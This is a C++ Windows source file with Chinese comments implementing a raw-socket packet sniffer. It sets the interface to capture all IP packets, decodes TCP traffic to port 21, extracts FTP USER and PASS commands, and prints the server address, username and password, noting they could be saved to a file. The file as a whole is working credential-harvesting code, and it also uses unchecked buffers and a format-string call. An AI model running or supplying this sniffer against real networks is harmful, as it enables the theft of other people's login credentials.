#include "initsock.h"
#include "protoinfo.h"
#include<iostream>

#include <stdio.h>
#include <mstcpip.h>
using namespace std;

#pragma comment(lib, "Advapi32.lib")

CInitSock theSock;

void GetFtp(char *pData, DWORD dwDestIp)
{
	char szBuf[256];
	static char szUserName[21];
	static char szPassword[21];

	if(strnicmp(pData, "USER ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szUserName);	
	}
	else if(strnicmp(pData, "PASS ", 5) == 0)
	{
		sscanf(pData + 4, "%*[ ]%s", szPassword);

		wsprintf(szBuf, " Server Address: %s; User Name: %s; Password: %s; \n\n", ::inet_ntoa(*(in_addr*)&dwDestIp), szUserName, szPassword);

		printf(szBuf);	// 这里您可以将它保存到文件中
	}
}

//具体结构体定义在protoinfo.h中 
void DecodeIPPacket(char *pData)
{
	//获取ip头部 
	IPHeader *pIPHdr = (IPHeader*)pData;
	// iphVerLen版本号和头长度（各占4位）
	int nHeaderLen = (pIPHdr->iphVerLen & 0xf) * sizeof(ULONG);
	//或缺协议类型 
	switch(pIPHdr->ipProtocol)
	{
		//处理ip协议 
	case IPPROTO_TCP:
		{
			
			TCPHeader *pTCPHdr = (TCPHeader *)(pData + nHeaderLen);
			switch(::ntohs(pTCPHdr->destinationPort))
			{
			case 21:	// ftp协议
				{
					cout<<"get info\n";
					GetFtp((char*)pTCPHdr + sizeof(TCPHeader), pIPHdr->ipDestination);
				}
				break;

			case 80:	// http协议...
			case 8080:
				
				break;
			}
		}
		break;
	case IPPROTO_UDP:
		break;
	case IPPROTO_ICMP:
		break; 
	}
}


int main()
{
	// 创建原始套节字
	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);

	// 获取本地IP地址
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent *pHost;
	gethostname(szHostName, 56);
	pHost = gethostbyname((char*)szHostName);
	if( pHost== NULL)	
		return -1;
	else{
		cout<<"可用ip为\n";
		int i=0;
		struct in_addr addr; 
		while(pHost->h_addr_list[i]!=0){
			
			cout<<"ip为："<<i<<"# "<<*(u_long*) pHost->h_addr_list[i++];
			
		}
	}
		
		 
	// 在调用ioctl之前，套节字必须绑定
	addr_in.sin_family  = AF_INET;
	addr_in.sin_port    = htons(0);
	//把可用ip列表中ip设置为绑定ip
	cout<<"\n请选择使用的本地ip\n";
	int ip_i;
	cin>>ip_i; 
	memcpy(&addr_in.sin_addr.S_un.S_addr, pHost->h_addr_list[ip_i], pHost->h_length);
	
	printf(" Binding to interface : %s \n", ::inet_ntoa(addr_in.sin_addr));
	if(bind(sRaw, (PSOCKADDR)&addr_in, sizeof(addr_in)) == SOCKET_ERROR){
		cout<<"绑定端口错误"<<endl;
		return -1;
	}
		

	// 设置SIO_RCVALL控制代码，以便接收所有的IP包	
	DWORD dwValue = 1;
	if(ioctlsocket(sRaw, SIO_RCVALL, &dwValue) != 0)	
		return -1;
	
	// 开始接收封包
	printf(" \n\n begin to monitor ftp password... \n\n");
	char buff[1024];
	int nRet;
	while(true)
	{
		nRet = recv(sRaw, buff, 1024, 0);
		if(nRet > 0)
		{
			//printf("ready\n"); 
			//cout<<buff;
			DecodeIPPacket(buff);
		}
	}
	closesocket(sRaw);
}

